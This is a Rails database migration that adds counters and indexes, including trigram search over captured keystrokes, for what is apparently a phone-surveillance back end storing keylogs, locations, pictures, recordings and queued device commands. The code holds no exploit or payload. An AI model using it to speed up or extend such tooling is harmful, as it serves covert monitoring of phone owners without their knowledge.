class AddModelOptimizations < ActiveRecord::Migration[6.0]
  disable_ddl_transaction!

  def up
    say_with_time "Adding counter_cache columns to smartphones..." do
      unless column_exists?(:smartphones, :keylogs_count)
        add_column :smartphones, :keylogs_count, :integer, default: 0, null: false
      end

      unless column_exists?(:smartphones, :commands_count)
        add_column :smartphones, :commands_count, :integer, default: 0, null: false
      end
    end

    say_with_time "Populating counter_cache values..." do
      execute <<-SQL
        UPDATE smartphones
        SET keylogs_count = (SELECT COUNT(*) FROM keylogs WHERE keylogs.smartphone_id = smartphones.id)
      SQL

      execute <<-SQL
        UPDATE smartphones
        SET commands_count = (SELECT COUNT(*) FROM pending_commands WHERE pending_commands.smartphone_id = smartphones.id)
      SQL
    end

    say_with_time "Adding composite indexes for common queries..." do
      # Keylogs: search by keystroke / full_text (trigram if extension available)
      unless index_exists?(:keylogs, [:smartphone_id, :app_package, :created_at], name: 'idx_keylogs_device_app_time')
        add_index :keylogs, [:smartphone_id, :app_package, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_keylogs_device_app_time',
                  algorithm: :concurrently
      end

      # Geo locations: composite for location history queries
      unless index_exists?(:geo_locations, [:smartphone_id, :date], name: 'idx_locations_device_date')
        add_index :geo_locations, [:smartphone_id, :date],
                  name: 'idx_locations_device_date',
                  algorithm: :concurrently
      end

      # Pictures: date-based lookups
      unless index_exists?(:pictures, [:smartphone_id, :date], name: 'idx_pictures_device_date')
        add_index :pictures, [:smartphone_id, :date],
                  name: 'idx_pictures_device_date',
                  algorithm: :concurrently
      end

      # Recordings: type + date lookup
      unless index_exists?(:recordings, [:smartphone_id, :date], name: 'idx_recordings_device_date')
        add_index :recordings, [:smartphone_id, :date],
                  name: 'idx_recordings_device_date',
                  algorithm: :concurrently
      end

      # Counter cache columns
      unless index_exists?(:smartphones, :keylogs_count, name: 'idx_smartphones_keylogs_count')
        add_index :smartphones, :keylogs_count,
                  name: 'idx_smartphones_keylogs_count',
                  algorithm: :concurrently
      end

      unless index_exists?(:smartphones, :commands_count, name: 'idx_smartphones_commands_count')
        add_index :smartphones, :commands_count,
                  name: 'idx_smartphones_commands_count',
                  algorithm: :concurrently
      end
    end

    say_with_time "Adding partial indexes for active devices..." do
      # Index for active device keylogs lookups
      unless index_exists?(:keylogs, :smartphone_id, name: 'idx_keylogs_active_devices')
        add_index :keylogs, [:smartphone_id, :created_at],
                  order: { created_at: :desc },
                  name: 'idx_keylogs_active_devices',
                  algorithm: :concurrently
      end

      # Partial index: pending commands awaiting response
      unless index_exists?(:pending_commands, :smartphone_id, name: 'idx_commands_pending_only')
        execute <<-SQL
          CREATE INDEX CONCURRENTLY idx_commands_pending_only
          ON pending_commands (smartphone_id, created_at DESC)
          WHERE status = 0;
        SQL
      end
    end

    say_with_time "Adding trigram index for keylog search (if pg_trgm available)..." do
      begin
        execute "CREATE EXTENSION IF NOT EXISTS pg_trgm"
        unless index_exists?(:keylogs, :keystroke, name: 'idx_keylogs_keystroke_trgm')
          execute <<-SQL
            CREATE INDEX CONCURRENTLY idx_keylogs_keystroke_trgm
            ON keylogs USING gin (keystroke gin_trgm_ops);
          SQL
        end
      rescue StandardError => e
        say "Skipping trigram index (pg_trgm not available): #{e.message}"
      end
    end
  end

  def down
    remove_index :keylogs, name: 'idx_keylogs_keystroke_trgm' if index_exists?(:keylogs, name: 'idx_keylogs_keystroke_trgm')
    remove_index :pending_commands, name: 'idx_commands_pending_only' if index_exists?(:pending_commands, name: 'idx_commands_pending_only')
    remove_index :keylogs, name: 'idx_keylogs_active_devices' if index_exists?(:keylogs, name: 'idx_keylogs_active_devices')
    remove_index :smartphones, name: 'idx_smartphones_commands_count' if index_exists?(:smartphones, name: 'idx_smartphones_commands_count')
    remove_index :smartphones, name: 'idx_smartphones_keylogs_count' if index_exists?(:smartphones, name: 'idx_smartphones_keylogs_count')
    remove_index :recordings, name: 'idx_recordings_device_date' if index_exists?(:recordings, name: 'idx_recordings_device_date')
    remove_index :pictures, name: 'idx_pictures_device_date' if index_exists?(:pictures, name: 'idx_pictures_device_date')
    remove_index :geo_locations, name: 'idx_locations_device_date' if index_exists?(:geo_locations, name: 'idx_locations_device_date')
    remove_index :keylogs, name: 'idx_keylogs_device_app_time' if index_exists?(:keylogs, name: 'idx_keylogs_device_app_time')

    remove_column :smartphones, :commands_count if column_exists?(:smartphones, :commands_count)
    remove_column :smartphones, :keylogs_count if column_exists?(:smartphones, :keylogs_count)
  end
end
